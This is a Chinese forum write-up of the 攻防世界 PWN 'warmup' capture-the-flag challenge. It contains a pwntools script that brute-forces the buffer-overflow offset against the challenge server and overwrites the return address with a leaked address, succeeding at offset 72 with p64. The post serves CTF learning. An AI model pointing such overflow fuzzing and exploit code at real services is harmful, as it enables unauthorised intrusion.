
# [原创]攻防世界PWN进阶区（warmup）

萌新报道，放几个攻防世界pwn的wp，希望顺带可以转个正

做过的第一个fuzz的题，记录一下

## warmup

![在这里插入图片描述](upload/attach/202002/KE263WAPU99U5JN.jpg)

这是一个没有附件的题，看起来题目是要求我们`fuzz`了

`nc`连接上后可以发现有个输入点，并且还给了我们一个十六进制数，看起来是个地址

![在这里插入图片描述](upload/attach/202002/848520_BKZUJB6U2UF2W3M.jpg)

那首先根据这些我们可以先将`fuzz()`函数写出来，分三种情况（不用他给的地址，用`p32`发送，用`p64`送）

```python
def fuzz(r, num, flag):
    payload = 'a' * num
    if flag == 1:
        payload += p32(addr)
    if flag == 2:
        payload += p64(addr)
    r.recvuntil(">")
    r.sendline(payload)
```

然后就可以写我们的`exp`了

```python
from pwn import *
#context.log_level = 'debug'
addr = 0x40060d

def fuzz(r, num, flag):
    payload = 'a' * num
    if flag == 1:
        payload += p32(addr)
    if flag == 2:
        payload += p64(addr)
    r.recvuntil(">")
    r.sendline(payload)

def main():
    for i in range(1000):
        print(i)
        for j in range(3):
            try:
                r = remote("111.198.29.45", 46588)
                fuzz(r, i, j)
                text = r.recv()
                print('text.len='+str(len(text))+'text='+text)
                print('num='+str(i)+' flag='+str(j))
                r.interactive()
            except:
                r.close()

if __name__ == '__main__':
    main()
```

结果如下

![在这里插入图片描述](upload/attach/202002/M6G7T52HN8CX748.jpg)

可以看到当`num`等于72，`flag`等于2，也就是说将题目给我们的地址以`p64`发送的时候会直接返回我们需要的答案

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [a.py](javascript:void(0);)

  （0.68kb，13次下载）
